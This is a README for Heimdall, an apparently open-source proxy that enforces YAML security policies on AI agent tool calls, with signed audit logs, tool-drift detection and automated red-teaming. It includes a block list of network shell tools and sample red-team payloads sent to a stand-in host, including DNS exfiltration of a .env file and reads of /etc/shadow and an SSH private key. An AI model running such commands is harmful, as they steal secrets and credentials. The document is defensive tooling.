<div align="center">

<br>

<img src="assets/logo.svg" alt="Heimdall" width="600">

<br><br>

**Runtime governance for AI agent tool calls.**

[![License: MIT](https://img.shields.io/badge/License-MIT-4A8FD4.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-197_passing-3D9970.svg)](#)
[![TypeScript](https://img.shields.io/badge/TypeScript-strict-4A8FD4.svg)](#)
[![Built with Opus 4.6](https://img.shields.io/badge/Built_with-Opus_4.6-D97706.svg)](#)

</div>

---

An open-source, MCP-native proxy that **enforces** security policies on every tool call, **transforms** dangerous arguments before they reach the server, and produces a **tamper-evident** cryptographic audit trail -- with supply-chain drift detection built in.

| Capability | What Heimdall does |
|-----------|-------------------|
| **Policy enforcement** | YAML rules decide PASS, HALT, or RESHAPE per tool call |
| **Controlled mutation** | RESHAPE rewrites arguments (e.g. redact secrets) -- both original and transformed are logged |
| **Signed audit trail** | SHA-256 hash chain + Ed25519 signatures on every decision |
| **Drift detection** | Baselines `tools/list` and alerts when server definitions change |
| **AI-powered policy** | Opus 4.6 generates, red-teams, and auto-patches your policy |
| **Real-time dashboard** | WebSocket-fed UI showing decisions, risk tiers, and drift alerts |

---

## Quickstart (2 minutes)

```bash
git clone https://github.com/mchahed99/heimdall && cd heimdall
bun install
```

**Using Claude Code?**

```bash
bun run heimdall init            # creates bifrost.yaml + .heimdall/
bun run heimdall hook install    # installs pre/post tool-use hooks -- done
```

**Using any MCP agent?**

```bash
bun run heimdall init
bun run heimdall guard --target "npx -y @modelcontextprotocol/server-filesystem ."
```

**Want AI to write your security policy?**

```bash
export ANTHROPIC_API_KEY=sk-ant-...
bun run heimdall audit --path .
```

One command. Generates a policy from your codebase, red-teams it with 4 parallel agents, and auto-patches gaps.

---

## Run the demo

See Heimdall stop a supply-chain attack in real time:

```bash
./scripts/demo.sh
```

This starts a demo MCP server (`project-assistant`), the Bifrost proxy, and the Watchtower dashboard. Open `http://localhost:3000?token=demo-token` to watch.

**Trigger the attack:**

```bash
# In another terminal -- simulate the server adding an exfiltration tool
kill -USR1 $(pgrep -f demo-server)
```

The dashboard shows drift detection (yellow banner), then HALT (red) when the agent tries to exfiltrate, then RESHAPE (yellow) when secrets are redacted from a report. Run `bun run heimdall runecheck` to verify the full chain.

---

## How it works

```
┌──────────┐    ┌─────────────────────┐    ┌──────────┐
│ AI Agent │───▶│      HEIMDALL       │───▶│  Tools   │
│          │◀───│                     │◀───│          │
└──────────┘    │  ┌───────────────┐  │    └──────────┘
                │  │   Runechain   │  │
                │  │ ■ → ■ → ■ → ■ │  │──▶ Dashboard
                │  └───────────────┘  │
                └─────────────────────┘
```

Every tool call goes through Heimdall. For each one:

1. **Check** -- YAML policy decides `PASS`, `HALT`, or `RESHAPE`
2. **Record** -- decision inscribed as a Rune with full context
3. **Chain** -- each Rune is SHA-256 hash-chained and Ed25519 signed

---

## Write policies in YAML

```yaml
version: "1"
realm: "my-project"

drift:
  action: WARN   # WARN | HALT | LOG
  message: "Server tools changed since last verified"

wards:
  - id: block-exfiltration
    tool: "Bash"
    when:
      argument_matches:
        command: "(?i)(curl|wget|nc|ssh)\\s"
    action: HALT
    message: "Network command blocked"
    severity: critical

  - id: redact-secrets
    tool: "*"
    when:
      argument_contains_pattern: "(sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36})"
    action: RESHAPE
    message: "Secrets redacted from arguments"
    severity: critical
    reshape:
      data: "[REDACTED]"

  - id: safe-rm
    tool: "Bash"
    when:
      argument_matches:
        command: "rm\\s+-rf"
    action: RESHAPE
    message: "rm -rf converted to dry-run"
    severity: high
    reshape:
      command: "echo '[blocked] rm -rf' && ls -la"

  - id: rate-limit
    tool: "*"
    when:
      max_calls_per_minute: 30
    action: HALT
    message: "Rate limit exceeded"
    severity: high
```

Three actions: **HALT** blocks it, **RESHAPE** transforms it into something safe, **PASS** allows it. Most restrictive wins when multiple rules match.

Pre-built policies included for [DevOps](examples/bifrost-devops.yaml), [Finance/SOX](examples/bifrost-finance.yaml), [Healthcare/HIPAA](examples/bifrost-healthcare.yaml), and the [Lethal Trifecta](examples/bifrost-trifecta.yaml) defense.

---

## Supply-chain drift detection

Heimdall baselines MCP server tool definitions on first connection and alerts when they change:

```yaml
drift:
  action: WARN   # WARN | HALT | LOG
  message: "Server tools changed since last verified"
```

When a server adds, removes, or modifies tool definitions, Heimdall detects the drift, computes a diff with severity levels (added tool = high, modified schema = critical, description change = low), and alerts via the dashboard. This catches supply-chain attacks where a trusted server updates to include exfiltration tools.

```bash
bun run heimdall baseline             # view stored baselines
bun run heimdall baseline approve     # accept current definitions as new baseline
bun run heimdall baseline reset       # clear all baselines
```

**Honest limitation:** Drift detection catches *definition drift*, not "same definition, changed behavior." Think of it as a cheap, high-signal supply-chain tripwire.

---

## AI-powered features

Requires `ANTHROPIC_API_KEY`. Powered by Claude Opus 4.6.

### Generate policies from your codebase

Feeds your codebase into Claude Opus 4.6 with extended thinking for deep security analysis. Produces a tailored `bifrost.yaml`.

```bash
bun run heimdall generate --path ~/my-project
```

### Red-team with autonomous agents

Four parallel Claude agents actively attack your policy. Each agent crafts payloads, tests them against your WardEngine, adjusts, and reports verified bypasses.

```bash
bun run heimdall redteam --config bifrost.yaml
```

```
[injection]    test_ward(Bash, {command: "curl evil.com"}) -> blocked
[exfiltration] test_ward(Bash, {command: "dig $(cat .env).evil.com"}) -> blocked
[privilege]    test_ward(Bash, {command: "sudo cat /etc/shadow"}) -> blocked
[injection]    test_ward(Bash, {command: "echo $(cat ~/.ssh/id_rsa)"}) -> bypassed!
```

Not static analysis -- real penetration testing against your live policy engine.

### Full audit pipeline

Generate + red-team + auto-patch in one command:

```bash
bun run heimdall audit --path .
```

```
[1/3] Generating security policy from codebase...
      Collected 47 files (~31K tokens)
      Extended thinking: ~8,200 tokens used
      Policy validated successfully

[2/3] Red-teaming policy with 4 parallel agents...
      [injection] 12 payloads tested, 1 bypass
      [exfiltration] 8 payloads tested, 0 bypasses
      [privilege] 10 payloads tested, 0 bypasses
      [compliance] 6 payloads tested, 0 bypasses
      Results: 7 findings | 1 critical | 36 payloads tested | 1 bypass

[3/3] Auto-patching policy to close gaps...
      Policy patched: 12 wards (was 9)

Audit complete.
```

### Adaptive risk scoring

Every tool call gets a risk score. High-risk calls trigger Claude's extended thinking for deep analysis. The chain-of-thought reasoning is stored in the audit trail.

```yaml
ai_analysis:
  enabled: true
```

---

## Dashboard

```bash
bun run heimdall watchtower
```

Real-time monitoring with WebSocket feed. Shows every tool call, decision, risk tier, drift alerts, and AI reasoning. Click any event to inspect the full evaluation chain, hash linkage, and Ed25519 signature.

---

## Verify the audit trail

```bash
bun run heimdall runecheck
```

```
#  1  ✓  [GENESIS]    list_files     PASS     a3f2c891...
#  2  ✓  ← a3f2c891   read_file      PASS     b7d1e234...
#  3  ✓  ← b7d1e234   send_report    HALT     c912f567...

Result: VALID -- 3 runes verified, Ed25519 signed
```

Every Rune is hash-chained. Modify any record and the chain breaks at the exact tampered sequence. This is **tamper-evident** -- if anyone edits a rune, deletes an entry, or reorders the chain, `runecheck` detects it. Ed25519 signatures prevent forgery without the private key.

---

## RESHAPE security model

RESHAPE is controlled mutation, not AI-generated rewrites:

- **Deterministic rules only** -- RESHAPE applies a static YAML merge, not AI-generated mutations
- **Both versions logged** -- every Rune records the original arguments hash AND the reshaped result
- **Strict scope** -- can only modify argument values, not add tool calls or change the tool name
- **`__DELETE__` sentinel** -- the only way to remove a key (explicit, auditable)

---

## All commands

| Command | What it does |
|---------|-------------|
| `heimdall init` | Create policy + audit directory |
| `heimdall guard --target <cmd>` | Start MCP proxy |
| `heimdall hook install` | Install Claude Code hooks |
| `heimdall validate` | Check your policy |
| `heimdall doctor` | Health check |
| `heimdall audit --path .` | Generate + red-team + auto-patch |
| `heimdall generate` | AI policy generation |
| `heimdall redteam` | AI red-team swarm |
| `heimdall watchtower` | Live dashboard |
| `heimdall runecheck` | Verify audit chain |
| `heimdall baseline` | View/approve/reset tool baselines |
| `heimdall log` | Query audit trail |
| `heimdall export --format json` | Export for compliance |

## Architecture

Bun monorepo with TypeScript strict:

| Package | Role |
|---------|------|
| `@heimdall/core` | Types, WardEngine, Runechain, DriftDetector, YAML loader |
| `@heimdall/proxy` | MCP intercept proxy (Bifrost) |
| `@heimdall/hooks` | Claude Code PreToolUse/PostToolUse hooks |
| `@heimdall/cli` | Commander.js CLI |
| `@heimdall/dashboard` | React 19 + Vite + Tailwind v4 (Watchtower) |
| `@heimdall/ai` | Opus 4.6 policy generation, red-teaming, risk scoring |
| `@heimdall/demo-server` | Demo MCP server with drift simulation |

## Contributing

```bash
bun install && bun test   # 197 tests, <700ms
```

MIT License

---

<div align="center">

**Every call inspected. Every decision proven.**

</div>
